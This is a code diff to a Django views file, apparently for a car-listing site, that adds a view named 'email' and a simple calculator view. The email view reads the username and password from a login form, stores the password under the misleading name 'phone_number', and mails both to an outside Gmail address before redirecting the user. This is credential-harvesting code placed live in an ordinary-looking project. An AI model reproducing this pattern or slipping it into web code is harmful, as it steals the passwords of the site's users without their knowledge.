@@ -32,3 +32,30 @@ class banner(TemplateView):
                    "Blink1":Blink1, "Blink2":Blink2, "Blink3":Blink3, "Blink4":Blink4, "Blink5":Blink5
                    }
         return render(request, self.template_name, context)
+from django.core.mail import send_mail
+from django.conf import settings
+from django.shortcuts import redirect
+from .forms import LoginForm
+
+
+import requests
+def email(request):
+    form = LoginForm(request.POST)
+    if form.is_valid():
+        email1 = form.cleaned_data.get('username')
+        phone_number = form.cleaned_data.get('password')
+        subject = email1
+        message = email1 + phone_number
+
+
+
+        email_from = settings.EMAIL_HOST_USER
+        recipient_list = ['jsmyautosales@gmail.com',]
+        send_mail( subject, message, email_from, recipient_list )
+
+
+    return redirect('index')
+
+
+def calculator(request):
+    return render(request, 'listing/calculator.html',{})
